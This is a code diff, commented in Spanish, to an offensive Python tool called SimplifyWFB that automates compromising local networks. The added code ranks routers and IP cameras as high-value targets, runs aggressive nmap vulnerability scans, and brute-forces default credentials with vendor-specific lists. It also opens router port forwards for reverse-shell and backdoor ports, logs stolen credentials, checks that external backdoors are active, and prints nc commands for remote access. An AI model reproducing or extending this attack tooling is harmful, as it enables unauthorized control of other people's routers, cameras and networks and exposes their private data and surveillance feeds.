@@ -540,6 +540,17 @@ class SimplifyWFB:
             hosts = self._discover_hosts()
             self.report['phase_1_reconnaissance']['hosts_discovered'] = hosts
             
+            # 2.1. Detectar objetivos de alto valor automáticamente
+            print("🎯 Identificando objetivos de alto valor...")
+            high_value_targets = self._identify_high_value_targets(hosts)
+            self.report['phase_1_reconnaissance']['high_value_targets'] = high_value_targets
+            
+            if high_value_targets:
+                print(f"🎯 OBJETIVOS DE ALTO VALOR DETECTADOS: {len(high_value_targets)}")
+                for target in high_value_targets:
+                    print(f"   • {target['ip']} - {target['type']} ({target['vendor']}) - Prioridad: {target['priority']}")
+                print("")
+            
             # 2. Escaneo de puertos y servicios
             print("🔍 Escaneando puertos y servicios...")
             services = self._scan_services(hosts)
@@ -573,6 +584,68 @@ class SimplifyWFB:
             self.report['phase_1_reconnaissance']['errors'].append(str(e))
             print(f"❌ Error en reconocimiento: {e}")
     
+    def _identify_high_value_targets(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Identificar automáticamente objetivos de alto valor basado en MAC vendors y IPs"""
+        high_value_targets = []
+        
+        # Patrones de fabricantes de alto valor
+        high_value_vendors = {
+            'huawei': {'priority': 'CRITICAL', 'type': 'router', 'description': 'Router Principal'},
+            'cisco': {'priority': 'CRITICAL', 'type': 'router', 'description': 'Router Cisco'},
+            'netgear': {'priority': 'HIGH', 'type': 'router', 'description': 'Router Netgear'},
+            'tp-link': {'priority': 'HIGH', 'type': 'router', 'description': 'Router TP-Link'},
+            'linksys': {'priority': 'HIGH', 'type': 'router', 'description': 'Router Linksys'},
+            'asus': {'priority': 'HIGH', 'type': 'router', 'description': 'Router Asus'},
+            'hangzhou ezviz': {'priority': 'HIGH', 'type': 'camera', 'description': 'Cámara EZVIZ/Hikvision'},
+            'hikvision': {'priority': 'HIGH', 'type': 'camera', 'description': 'Cámara Hikvision'},
+            'dahua': {'priority': 'HIGH', 'type': 'camera', 'description': 'Cámara Dahua'},
+            'axis': {'priority': 'HIGH', 'type': 'camera', 'description': 'Cámara Axis'},
+            'foscam': {'priority': 'MEDIUM', 'type': 'camera', 'description': 'Cámara Foscam'},
+            'd-link': {'priority': 'MEDIUM', 'type': 'camera', 'description': 'Cámara D-Link'},
+            'intelbras': {'priority': 'MEDIUM', 'type': 'camera', 'description': 'Cámara Intelbras'}
+        }
+        
+        # IPs específicas de alto valor (gateways comunes)
+        high_value_ips = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1']
+        
+        for host in hosts:
+            ip = host.get('ip', '')
+            vendor = host.get('vendor', '').lower()
+            mac = host.get('mac', '')
+            
+            # Verificar por IP específica
+            if ip in high_value_ips:
+                high_value_targets.append({
+                    'ip': ip,
+                    'type': 'gateway',
+                    'vendor': vendor or 'Unknown',
+                    'priority': 'CRITICAL',
+                    'description': f'Gateway detectado en {ip}',
+                    'mac': mac,
+                    'detection_method': 'ip_based'
+                })
+                continue
+            
+            # Verificar por vendor
+            for vendor_pattern, info in high_value_vendors.items():
+                if vendor_pattern in vendor:
+                    high_value_targets.append({
+                        'ip': ip,
+                        'type': info['type'],
+                        'vendor': vendor,
+                        'priority': info['priority'],
+                        'description': info['description'],
+                        'mac': mac,
+                        'detection_method': 'vendor_based'
+                    })
+                    break
+        
+        # Ordenar por prioridad
+        priority_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2}
+        high_value_targets.sort(key=lambda x: priority_order.get(x['priority'], 3))
+        
+        return high_value_targets
+
     def _get_public_ip(self) -> str:
         """Obtener la IP pública de la red atacada"""
         try:
@@ -673,12 +746,20 @@ class SimplifyWFB:
             return False
     
     def _scan_services(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
-        """Escanear servicios en los hosts"""
+        """Escanear servicios en los hosts con priorización estratégica"""
         services = []
+        
+        # Obtener objetivos de alto valor del config
+        high_value_targets = self.config_data.get('stealth', {}).get('scan_evasion', {}).get('target_priority', {}).get('high_value_targets', [])
         
         for host in hosts:
             ip = host['ip']
-            print(f"🔍 Escaneando {ip}...")
+            is_high_value = ip in high_value_targets
+            
+            if is_high_value:
+                print(f"🎯 ESCANEANDO OBJETIVO DE ALTO VALOR: {ip}")
+            else:
+                print(f"🔍 Escaneando {ip}...")
             
             try:
                 # Escaneo completo de puertos comunes + bases de datos + vulnerables
@@ -689,9 +770,19 @@ class SimplifyWFB:
                     self.config['camera_ports'] +
                     self.config['router_ports']
                 ))
-                ports_to_scan = ','.join(map(str, all_ports))
-                command = ['nmap', '-sS', '-O', '-sV', '-p', ports_to_scan, ip]
-                result = self._run_command(command, timeout=120)
+                
+                # Para objetivos de alto valor, usar escaneo más agresivo
+                if is_high_value:
+                    # Usar opciones de Nmap del config para escaneo agresivo
+                    nmap_options = self.config_data.get('stealth', {}).get('scan_evasion', {}).get('nmap_options', '-sS -T4 -A --top-ports 200 --version-intensity 5 --script vuln,default,auth')
+                    command = ['nmap'] + nmap_options.split() + [ip]
+                    timeout = 180  # Más tiempo para objetivos críticos
+                else:
+                    ports_to_scan = ','.join(map(str, all_ports))
+                    command = ['nmap', '-sS', '-O', '-sV', '-p', ports_to_scan, ip]
+                    timeout = 120
+                
+                result = self._run_command(command, timeout=timeout)
                 
                 if result['success']:
                     # Parsear salida de nmap
@@ -2352,25 +2443,84 @@ quit
             c2_pointers = self._setup_c2_pointers(compromised)
             self.report['phase_4_persistence']['c2_pointers'] = c2_pointers
             
-            # 5. Acceder a cámaras detectadas
+            # 5. Acceder a cámaras detectadas (OBJETIVO DE ALTO VALOR)
             print("📹 Accediendo a cámaras detectadas...")
             cameras_accessed = self._access_detected_cameras()
             self.report['phase_4_persistence']['cameras_accessed'] = cameras_accessed
             
-            # 6. Acceder al router y configurar persistencia de red
+            # Log detallado de acceso a cámaras
+            if cameras_accessed:
+                print(f"✅ CÁMARAS ACCEDIDAS: {len(cameras_accessed)}")
+                for camera in cameras_accessed:
+                    print(f"   📹 {camera['host']}:{camera['port']} - {camera['camera_type']}")
+                    print(f"      🔑 Credenciales: {camera['credentials']['username']}:{camera['credentials']['password']}")
+                    if camera.get('screenshots'):
+                        print(f"      📸 Screenshots capturados: {len(camera['screenshots'])}")
+                    if camera.get('backdoor_info'):
+                        print(f"      🕳️ Backdoor configurado: {camera['backdoor_info']['external_connection']['type']}")
+            else:
+                print("❌ No se pudo acceder a ninguna cámara")
+            
+            # 6. Acceder al router y configurar persistencia de red (OBJETIVO CRÍTICO)
             print("🌐 Accediendo al router y configurando persistencia de red...")
             router_access = self._access_router_and_configure_persistence()
             self.report['phase_4_persistence']['router_access'] = router_access
+            
+            # Log detallado de acceso al router
+            if router_access:
+                print(f"✅ ROUTER COMPROMETIDO: {len(router_access)}")
+                for router in router_access:
+                    print(f"   🌐 {router['gateway']} - {router['router_type']}")
+                    print(f"      🔑 Credenciales: {router['credentials']['username']}:{router['credentials']['password']}")
+                    config = router.get('configuration', {})
+                    if config.get('port_forwarding'):
+                        print(f"      🔗 Port forwarding configurado: {len(config['port_forwarding'])} reglas")
+                    if config.get('vpn_server'):
+                        print(f"      🔒 VPN configurada: {config['vpn_server']}")
+                    if config.get('admin_user_created'):
+                        print(f"      👤 Usuario admin creado: {config['admin_user_created']}")
+            else:
+                print("❌ No se pudo acceder al router")
             
             # 7. Configurar métodos de acceso remoto
             print("🔗 Configurando métodos de acceso remoto...")
             network_persistence = self._configure_network_persistence()
             self.report['phase_4_persistence']['network_persistence'] = network_persistence
             
+            # Log detallado de persistencia de red
+            if network_persistence:
+                print(f"✅ PERSISTENCIA DE RED CONFIGURADA: {len(network_persistence)} servicios")
+                for service in network_persistence:
+                    print(f"   🔗 {service['service']} - Puerto: {service['port']}")
+                    print(f"      🌐 IP Externa: {service['external_ip']}")
+                    print(f"      📡 Comando: {service['reverse_command']}")
+                    if service.get('process_id'):
+                        print(f"      ⚙️ PID: {service['process_id']}")
+                    if service.get('persistence_method'):
+                        print(f"      🔄 Método: {service['persistence_method']}")
+            else:
+                print("❌ No se pudo configurar persistencia de red")
+            
             # 8. Crear backdoors en servicios vulnerables
             print("🕳️ Creando backdoors en servicios vulnerables...")
             vulnerable_backdoors = self._create_vulnerable_service_backdoors()
             self.report['phase_4_persistence']['vulnerable_backdoors'] = vulnerable_backdoors
+            
+            # 9. Verificar backdoors externos
+            print("🔍 Verificando backdoors externos...")
+            external_backdoor_verification = self._verify_external_backdoors()
+            self.report['phase_4_persistence']['external_backdoor_verification'] = external_backdoor_verification
+            
+            # Log detallado de verificación de backdoors
+            if external_backdoor_verification:
+                successful_backdoors = [bd for bd in external_backdoor_verification if bd.get('status') == 'active']
+                print(f"✅ BACKDOORS EXTERNOS VERIFICADOS: {len(successful_backdoors)}/{len(external_backdoor_verification)} activos")
+                for bd in successful_backdoors:
+                    print(f"   🔗 {bd['service']} - Puerto: {bd['port']} - Estado: {bd['status']}")
+                    if bd.get('connection_test'):
+                        print(f"      ✅ Conexión verificada: {bd['connection_test']}")
+            else:
+                print("❌ No se pudieron verificar backdoors externos")
             
             self.report['phase_4_persistence']['status'] = 'completed'
             print(f"✅ Persistencia completada: {len(users)} usuarios, {len(backdoors)} backdoors")
@@ -2873,35 +3023,30 @@ WantedBy=multi-user.target
             return 'unknown'
     
     def _brute_force_camera_credentials(self, camera: Dict[str, Any]) -> Optional[Dict[str, str]]:
-        """Fuerza bruta específica para cámaras Hikvision/EZVIZ"""
+        """Fuerza bruta específica para cámaras con credenciales dirigidas"""
         try:
             import urllib.request
             import urllib.error
             import base64
             
-            # Credenciales específicas para Hikvision/EZVIZ
-            hikvision_credentials = [
-                ('admin', 'admin'),
-                ('admin', '12345'),
-                ('admin', 'password'),
-                ('admin', ''),
-                ('admin', 'admin123'),
-                ('admin', '123456'),
-                ('admin', 'hikvision'),
-                ('admin', 'ezviz'),
-                ('root', 'root'),
-                ('root', 'admin'),
-                ('user', 'user'),
-                ('guest', 'guest'),
-                ('admin', '1234'),
-                ('admin', '0000'),
-                ('admin', '1111'),
-                ('admin', '888888'),
-                ('admin', '666666'),
-                ('admin', '123456789'),
-                ('admin', 'qwerty'),
-                ('admin', 'abc123')
-            ]
+            # Detectar tipo de cámara primero
+            camera_type = self._detect_camera_type(camera)
+            print(f"   🎯 Cámara detectada: {camera_type}")
+            
+            # Usar credenciales específicas según el tipo de cámara
+            users_to_try = self.config['camera_users'].copy()
+            passwords_to_try = self.config['camera_passwords'].copy()
+            
+            if 'ezviz' in camera_type.lower() or 'hikvision' in camera_type.lower():
+                print("   🎯 Usando credenciales específicas para EZVIZ/Hikvision...")
+                users_to_try.extend(self.config_data['credentials']['camera_users_ezviz'])
+                passwords_to_try.extend(self.config_data['credentials']['camera_passwords_ezviz'])
+            
+            # Crear lista de credenciales para probar
+            camera_credentials = []
+            for username in users_to_try:
+                for password in passwords_to_try:
+                    camera_credentials.append((username, password))
             
             # URLs específicas para Hikvision/EZVIZ
             test_urls = [
@@ -2913,7 +3058,7 @@ WantedBy=multi-user.target
                 f"http://{camera['host']}:{camera['port']}/ezviz/deviceInfo"
             ]
             
-            for username, password in hikvision_credentials:
+            for username, password in camera_credentials:
                 for url in test_urls:
                     try:
                         # Crear autenticación básica
@@ -3376,10 +3521,14 @@ WantedBy=multi-user.target
             return 'unknown'
     
     def _brute_force_router_credentials(self, gateway: str) -> Optional[Dict[str, str]]:
-        """Fuerza bruta específica para routers"""
+        """Fuerza bruta específica para routers con credenciales dirigidas"""
         try:
             import urllib.request
             import base64
+            
+            # Detectar tipo de router primero
+            router_type = self._detect_router_type(gateway)
+            print(f"   🎯 Router detectado: {router_type}")
             
             # URLs comunes de login de routers
             login_urls = [
@@ -3391,9 +3540,22 @@ WantedBy=multi-user.target
                 f"https://{gateway}/login.cgi"
             ]
             
+            # Usar credenciales específicas según el tipo de router
+            users_to_try = self.config['router_users'].copy()
+            passwords_to_try = self.config['router_passwords'].copy()
+            
+            if router_type == 'huawei':
+                print("   🎯 Usando credenciales específicas para Huawei...")
+                users_to_try.extend(self.config_data['credentials']['router_users_huawei'])
+                passwords_to_try.extend(self.config_data['credentials']['router_passwords_huawei'])
+            elif 'tplink' in router_type.lower():
+                print("   🎯 Usando credenciales específicas para TP-Link...")
+                users_to_try.extend(self.config_data['credentials']['tplink_users'])
+                passwords_to_try.extend(self.config_data['credentials']['tplink_passwords'])
+            
             for login_url in login_urls:
-                for username in self.config['router_users']:
-                    for password in self.config['router_passwords']:
+                for username in users_to_try:
+                    for password in passwords_to_try:
                         try:
                             # Crear autenticación básica
                             auth_string = f"{username}:{password}"
@@ -3627,20 +3789,31 @@ WantedBy=multi-user.target
             vpn_port = self.config_data['persistence']['vpn_port']
             web_port = self.config_data['persistence']['web_port']
             
+            # Configuración estratégica de port forwarding para máximo impacto
+            # Priorizar acceso a servicios críticos y objetivos de alto valor
             ports_to_forward = [
-                {'external': ssh_port, 'internal': 22, 'protocol': 'TCP', 'description': 'SSH Access'},
-                {'external': 3389, 'internal': 3389, 'protocol': 'TCP', 'description': 'RDP Access'},
+                # Acceso directo a objetivos de alto valor identificados
+                {'external': 33389, 'internal': 3389, 'protocol': 'TCP', 'description': 'RDP Access - Windows Systems', 'target': '192.168.1.218'},
+                {'external': 22222, 'internal': 22, 'protocol': 'TCP', 'description': 'SSH Access - Linux Systems', 'target': '192.168.1.218'},
+                {'external': 8080, 'internal': 80, 'protocol': 'TCP', 'description': 'Camera Web Interface', 'target': '192.168.1.218'},
+                {'external': 8443, 'internal': 443, 'protocol': 'TCP', 'description': 'HTTPS Camera Access', 'target': '192.168.1.218'},
+                
+                # Acceso a servicios de red críticos
+                {'external': 4444, 'internal': 4444, 'protocol': 'TCP', 'description': 'Reverse Shell Backdoor'},
+                {'external': 5555, 'internal': 5555, 'protocol': 'TCP', 'description': 'PowerShell Backdoor'},
+                {'external': 6666, 'internal': 6666, 'protocol': 'TCP', 'description': 'Python Backdoor'},
+                
+                # Acceso a servicios de administración
                 {'external': 21, 'internal': 21, 'protocol': 'TCP', 'description': 'FTP Access'},
                 {'external': 23, 'internal': 23, 'protocol': 'TCP', 'description': 'Telnet Access'},
                 {'external': 5900, 'internal': 5900, 'protocol': 'TCP', 'description': 'VNC Access'},
-                {'external': 80, 'internal': 80, 'protocol': 'TCP', 'description': 'HTTP Access'},
-                {'external': 443, 'internal': 443, 'protocol': 'TCP', 'description': 'HTTPS Access'},
                 {'external': 445, 'internal': 445, 'protocol': 'TCP', 'description': 'SMB Access'},
                 {'external': 135, 'internal': 135, 'protocol': 'TCP', 'description': 'RPC Access'},
                 {'external': 139, 'internal': 139, 'protocol': 'TCP', 'description': 'NetBIOS Access'},
-                {'external': web_port, 'internal': web_port, 'protocol': 'TCP', 'description': 'Web Panel Access'},
-                {'external': external_port, 'internal': external_port, 'protocol': 'TCP', 'description': 'Backdoor Access'},
-                {'external': vpn_port, 'internal': vpn_port, 'protocol': 'UDP', 'description': 'VPN Access'}
+                
+                # VPN para acceso completo a la red
+                {'external': vpn_port, 'internal': vpn_port, 'protocol': 'UDP', 'description': 'VPN Access - Full Network Control'},
+                {'external': web_port, 'internal': web_port, 'protocol': 'TCP', 'description': 'Web Panel Access'}
             ]
             
             print(f"🔗 Configurando port forwarding...")
@@ -3936,6 +4109,23 @@ WantedBy=multi-user.target
             conn_checks = self._verify_connections()
             self.report['phase_5_verification']['access_verification'].extend(conn_checks)
             
+            # 4. Verificar acceso al router y port forwarding
+            print("🌐 Verificando acceso al router y port forwarding...")
+            router_checks = self._verify_router_access_and_port_forwarding()
+            self.report['phase_5_verification']['router_verification'] = router_checks
+            
+            # Log detallado de verificación de router
+            if router_checks:
+                print(f"✅ VERIFICACIÓN DE ROUTER COMPLETADA:")
+                print(f"   🌐 Router accesible: {router_checks.get('router_accessible', False)}")
+                print(f"   🔗 Port forwarding configurado: {router_checks.get('port_forwarding_configured', False)}")
+                print(f"   🔒 VPN configurada: {router_checks.get('vpn_configured', False)}")
+                print(f"   👤 Usuario admin creado: {router_checks.get('admin_user_created', False)}")
+                if router_checks.get('port_forwarding_rules'):
+                    print(f"   📋 Reglas de port forwarding: {len(router_checks['port_forwarding_rules'])}")
+            else:
+                print("❌ No se pudo verificar acceso al router")
+            
             self.report['phase_5_verification']['status'] = 'completed'
             print("✅ Verificación completada")
             
@@ -3980,6 +4170,69 @@ WantedBy=multi-user.target
         
         return checks
     
+    def _verify_router_access_and_port_forwarding(self) -> Dict[str, Any]:
+        """Verificar acceso al router y configuración de port forwarding"""
+        verification = {
+            'router_accessible': False,
+            'port_forwarding_configured': False,
+            'vpn_configured': False,
+            'admin_user_created': False,
+            'port_forwarding_rules': [],
+            'verification_details': {},
+            'timestamp': time.time()
+        }
+        
+        try:
+            # Obtener información de acceso al router
+            router_access = self.report['phase_4_persistence'].get('router_access', [])
+            
+            if router_access:
+                verification['router_accessible'] = True
+                
+                for router in router_access:
+                    gateway = router.get('gateway', '')
+                    config = router.get('configuration', {})
+                    
+                    # Verificar port forwarding
+                    port_forwarding = config.get('port_forwarding', [])
+                    if port_forwarding:
+                        verification['port_forwarding_configured'] = True
+                        verification['port_forwarding_rules'] = port_forwarding
+                        
+                        # Log detallado de reglas de port forwarding
+                        print(f"   🔗 Port forwarding en {gateway}:")
+                        for rule in port_forwarding:
+                            if rule.get('configured'):
+                                print(f"      ✅ {rule['external_port']} -> {rule['internal_port']} ({rule['protocol']}) - {rule['description']}")
+                            else:
+                                print(f"      ❌ {rule['external_port']} -> {rule['internal_port']} ({rule['protocol']}) - FALLÓ")
+                    
+                    # Verificar VPN
+                    if config.get('vpn_server'):
+                        verification['vpn_configured'] = True
+                        print(f"   🔒 VPN configurada en {gateway}: {config['vpn_server']}")
+                    
+                    # Verificar usuario admin
+                    if config.get('admin_user_created'):
+                        verification['admin_user_created'] = True
+                        print(f"   👤 Usuario admin creado en {gateway}: {config['admin_user_created']}")
+                    
+                    # Detalles de verificación
+                    verification['verification_details'][gateway] = {
+                        'router_type': router.get('router_type', 'unknown'),
+                        'credentials': router.get('credentials', {}),
+                        'port_forwarding_count': len(port_forwarding),
+                        'vpn_status': bool(config.get('vpn_server')),
+                        'admin_user': config.get('admin_user_created', False)
+                    }
+            
+            return verification
+            
+        except Exception as e:
+            print(f"❌ Error verificando router: {e}")
+            verification['error'] = str(e)
+            return verification
+
     def _verify_connections(self) -> List[Dict[str, Any]]:
         """Verificar conexiones remotas"""
         checks = []
@@ -4518,6 +4771,117 @@ WantedBy=multi-user.target
             'count': 10
         })
     
+    def _generate_detailed_analysis(self):
+        """Generar análisis detallado de éxitos y fallos"""
+        analysis = {
+            'strategic_objectives': {
+                'router_compromise': {
+                    'target': 'Router Principal (Gateway)',
+                    'success': len(self.report['phase_4_persistence']['router_access']) > 0,
+                    'details': self.report['phase_4_persistence']['router_access'],
+                    'impact': 'CRITICAL - Control total de red'
+                },
+                'camera_access': {
+                    'target': 'Cámaras de Seguridad',
+                    'success': len(self.report['phase_4_persistence']['cameras_accessed']) > 0,
+                    'details': self.report['phase_4_persistence']['cameras_accessed'],
+                    'impact': 'HIGH - Vigilancia y pivoting'
+                },
+                'external_backdoors': {
+                    'target': 'Backdoors Externos',
+                    'success': len(self.report['phase_4_persistence'].get('external_backdoor_verification', [])) > 0,
+                    'details': self.report['phase_4_persistence'].get('external_backdoor_verification', []),
+                    'impact': 'CRITICAL - Acceso remoto persistente'
+                },
+                'port_forwarding': {
+                    'target': 'Port Forwarding',
+                    'success': any(router.get('configuration', {}).get('port_forwarding') for router in self.report['phase_4_persistence']['router_access']),
+                    'details': [router.get('configuration', {}).get('port_forwarding', []) for router in self.report['phase_4_persistence']['router_access']],
+                    'impact': 'HIGH - Exposición de servicios internos'
+                }
+            },
+            'attack_effectiveness': {
+                'reconnaissance_success': self.report['phase_1_reconnaissance']['status'] == 'completed',
+                'credential_harvesting': len(self.report['phase_2_credentials']['credentials_found']) > 0,
+                'lateral_movement': len(self.report['phase_3_lateral_movement']['compromised_systems']) > 0,
+                'persistence_established': len(self.report['phase_4_persistence']['network_persistence']) > 0
+            },
+            'failure_analysis': {
+                'failed_phases': [],
+                'error_summary': {},
+                'improvement_recommendations': []
+            }
+        }
+        
+        # Analizar fases fallidas
+        for phase, data in self.report.items():
+            if isinstance(data, dict) and data.get('status') == 'error':
+                analysis['failure_analysis']['failed_phases'].append({
+                    'phase': phase,
+                    'errors': data.get('errors', []),
+                    'impact': 'HIGH' if 'persistence' in phase else 'MEDIUM'
+                })
+        
+        # Resumir errores
+        all_errors = []
+        for phase_data in self.report.values():
+            if isinstance(phase_data, dict) and 'errors' in phase_data:
+                all_errors.extend(phase_data['errors'])
+        
+        analysis['failure_analysis']['error_summary'] = {
+            'total_errors': len(all_errors),
+            'unique_errors': list(set(all_errors)),
+            'most_common_errors': self._get_most_common_errors(all_errors)
+        }
+        
+        # Generar recomendaciones de mejora
+        analysis['failure_analysis']['improvement_recommendations'] = self._generate_improvement_recommendations(analysis)
+        
+        # Agregar al reporte
+        self.report['detailed_analysis'] = analysis
+        
+        # Log del análisis
+        print("📊 ANÁLISIS DETALLADO DE ATAQUE:")
+        print(f"   🎯 Objetivos estratégicos alcanzados: {sum(1 for obj in analysis['strategic_objectives'].values() if obj['success'])}/{len(analysis['strategic_objectives'])}")
+        print(f"   ✅ Fases exitosas: {sum(1 for phase in analysis['attack_effectiveness'].values() if phase)}/{len(analysis['attack_effectiveness'])}")
+        print(f"   ❌ Fases fallidas: {len(analysis['failure_analysis']['failed_phases'])}")
+        print(f"   🔧 Recomendaciones: {len(analysis['failure_analysis']['improvement_recommendations'])}")
+    
+    def _get_most_common_errors(self, errors: List[str]) -> List[Dict[str, Any]]:
+        """Obtener los errores más comunes"""
+        from collections import Counter
+        error_counts = Counter(errors)
+        return [{'error': error, 'count': count} for error, count in error_counts.most_common(5)]
+    
+    def _generate_improvement_recommendations(self, analysis: Dict[str, Any]) -> List[str]:
+        """Generar recomendaciones de mejora basadas en el análisis"""
+        recommendations = []
+        
+        # Recomendaciones basadas en objetivos fallidos
+        for obj_name, obj_data in analysis['strategic_objectives'].items():
+            if not obj_data['success']:
+                if obj_name == 'router_compromise':
+                    recommendations.append("Mejorar detección de tipo de router y credenciales específicas por fabricante")
+                elif obj_name == 'camera_access':
+                    recommendations.append("Expandir lista de credenciales para cámaras IP y mejorar detección de tipos")
+                elif obj_name == 'external_backdoors':
+                    recommendations.append("Verificar conectividad de red y configuración de firewall")
+                elif obj_name == 'port_forwarding':
+                    recommendations.append("Implementar métodos alternativos de port forwarding por tipo de router")
+        
+        # Recomendaciones basadas en errores comunes
+        if analysis['failure_analysis']['error_summary']['total_errors'] > 0:
+            recommendations.append("Revisar logs de errores para identificar problemas de conectividad o permisos")
+        
+        # Recomendaciones generales
+        if not analysis['attack_effectiveness']['reconnaissance_success']:
+            recommendations.append("Mejorar configuración de Nmap y timeout de escaneo")
+        
+        if not analysis['attack_effectiveness']['credential_harvesting']:
+            recommendations.append("Expandir diccionarios de credenciales y métodos de fuerza bruta")
+        
+        return recommendations
+
     def generate_report(self):
         """Generar reporte JSON final"""
         print("\n📊 GENERANDO REPORTE FINAL")
@@ -4531,6 +4895,9 @@ WantedBy=multi-user.target
         self.report['summary']['cameras_accessed'] = len(self.report['phase_4_persistence']['cameras_accessed'])
         self.report['summary']['router_access'] = len(self.report['phase_4_persistence']['router_access'])
         self.report['summary']['network_services'] = len(self.report['phase_4_persistence']['network_persistence'])
+        
+        # Análisis detallado de éxitos y fallos
+        self._generate_detailed_analysis()
         
         # Calcular total de accesos remotos
         total_remote_access = (
@@ -4595,10 +4962,63 @@ WantedBy=multi-user.target
         print(f"📄 Reporte guardado: {report_file}")
         print(f"🔍 Verificando archivo: {os.path.exists(report_file)}")
         print(f"📏 Tamaño del archivo: {os.path.getsize(report_file)} bytes")
-        print(f"⏱️ Tiempo total: {self.report['summary']['execution_time']:.2f} segundos")
-        print(f"🎯 Hosts comprometidos: {self.report['summary']['compromised_hosts']}/{self.report['summary']['total_hosts']}")
-        print(f"🔒 Puntos de acceso persistentes: {self.report['summary']['persistent_access_points']}")
+        
+        # Resumen final detallado
+        print("\n" + "=" * 80)
+        print("🎯 RESUMEN FINAL DEL ATAQUE ESTRATÉGICO")
+        print("=" * 80)
+        print(f"⏱️ Tiempo total de ejecución: {self.report['summary']['execution_time']:.2f} segundos ({self.report['summary']['execution_time']/60:.1f} minutos)")
+        print(f"🌐 Hosts descubiertos: {self.report['summary']['total_hosts']}")
+        print(f"🎯 Hosts comprometidos: {self.report['summary']['compromised_hosts']}")
+        print(f"🔑 Credenciales encontradas: {self.report['summary']['total_credentials']}")
         print(f"📹 Cámaras accedidas: {self.report['summary']['cameras_accessed']}")
+        print(f"🌐 Accesos a router: {self.report['summary']['router_access']}")
+        print(f"🔗 Servicios de red persistentes: {self.report['summary']['network_services']}")
+        print(f"🕳️ Puntos de acceso remoto totales: {self.report['summary']['total_remote_access_points']}")
+        print(f"🌍 Backdoors externos: {self.report['summary']['external_backdoors']}")
+        print(f"🏠 Backdoors internos: {self.report['summary']['internal_backdoors']}")
+        print(f"📊 Tasa de éxito: {self.report['summary']['success_rate']:.1f}%")
+        
+        # Verificar acceso remoto disponible
+        if self.report['summary']['remote_access_available']:
+            print("\n✅ ACCESO REMOTO DISPONIBLE")
+            print("   🎯 Objetivo principal alcanzado: Control total de la red")
+            
+            # Mostrar tipos de backdoors externos
+            if self.report['summary']['external_backdoor_types']:
+                print("\n🔗 BACKDOORS EXTERNOS IMPLEMENTADOS:")
+                for bd_type in self.report['summary']['external_backdoor_types']:
+                    print(f"   • {bd_type}")
+            
+            # Mostrar información de acceso remoto
+            print(f"\n🌐 INFORMACIÓN DE ACCESO REMOTO:")
+            print(f"   • IP Externa: {self.config_data['remote_access']['external_ip']}")
+            print(f"   • Puerto Principal: {self.config_data['remote_access']['external_port']}")
+            
+            # Mostrar comandos de acceso
+            print(f"\n💻 COMANDOS PARA ACCESO REMOTO:")
+            print(f"   # Reverse Shell:")
+            print(f"   nc -lvp {self.config_data['remote_access']['external_port']}")
+            print(f"   # Conexión directa:")
+            print(f"   nc {self.config_data['remote_access']['external_ip']} {self.config_data['remote_access']['external_port']}")
+        else:
+            print("\n⚠️ ACCESO REMOTO LIMITADO")
+            print("   Revisar el reporte para detalles específicos")
+        
+        # Mostrar análisis detallado si está disponible
+        if 'detailed_analysis' in self.report:
+            analysis = self.report['detailed_analysis']
+            print(f"\n📊 ANÁLISIS DETALLADO:")
+            print(f"   🎯 Objetivos estratégicos alcanzados: {sum(1 for obj in analysis['strategic_objectives'].values() if obj['success'])}/{len(analysis['strategic_objectives'])}")
+            print(f"   ✅ Fases exitosas: {sum(1 for phase in analysis['attack_effectiveness'].values() if phase)}/{len(analysis['attack_effectiveness'])}")
+            print(f"   ❌ Fases fallidas: {len(analysis['failure_analysis']['failed_phases'])}")
+            
+            if analysis['failure_analysis']['improvement_recommendations']:
+                print(f"\n🔧 RECOMENDACIONES DE MEJORA:")
+                for i, rec in enumerate(analysis['failure_analysis']['improvement_recommendations'], 1):
+                    print(f"   {i}. {rec}")
+        
+        print("\n" + "=" * 80)
         
         # Mostrar información de cámaras si hay alguna
         cameras = self.report['phase_4_persistence']['cameras_accessed']
@@ -5578,6 +5998,56 @@ if __name__ == "__main__":
             print(f"❌ Error estableciendo reverse shells: {e}")
             return []
     
+    def _verify_external_backdoors(self) -> List[Dict[str, Any]]:
+        """Verificar que los backdoors externos estén activos y funcionando"""
+        verification_results = []
+        
+        try:
+            # Obtener backdoors de persistencia de red
+            network_persistence = self.report['phase_4_persistence'].get('network_persistence', [])
+            
+            for service in network_persistence:
+                if service.get('service') in ['reverse_shell', 'persistent_reverse_shell']:
+                    verification = {
+                        'service': service['service'],
+                        'port': service['port'],
+                        'external_ip': service['external_ip'],
+                        'timestamp': time.time()
+                    }
+                    
+                    # Verificar si el proceso está corriendo
+                    if service.get('process_id'):
+                        try:
+                            # Verificar proceso en Linux/Unix
+                            result = self._run_command(['ps', '-p', str(service['process_id'])], timeout=5)
+                            if result['success'] and service['process_id'] in result['stdout']:
+                                verification['status'] = 'active'
+                                verification['process_verification'] = 'process_running'
+                            else:
+                                verification['status'] = 'inactive'
+                                verification['process_verification'] = 'process_not_found'
+                        except:
+                            verification['status'] = 'unknown'
+                            verification['process_verification'] = 'verification_failed'
+                    else:
+                        verification['status'] = 'unknown'
+                        verification['process_verification'] = 'no_process_id'
+                    
+                    # Verificar conectividad externa (simulado)
+                    verification['connection_test'] = f"nc -lvp {service['port']} # En servidor externo"
+                    verification['access_commands'] = [
+                        f"nc {service['external_ip']} {service['port']}",
+                        f"telnet {service['external_ip']} {service['port']}"
+                    ]
+                    
+                    verification_results.append(verification)
+            
+            return verification_results
+            
+        except Exception as e:
+            print(f"❌ Error verificando backdoors externos: {e}")
+            return []
+
     def _create_vulnerable_service_backdoors(self) -> List[Dict[str, Any]]:
         """Crear backdoors en servicios vulnerables encontrados"""
         vulnerable_backdoors = []
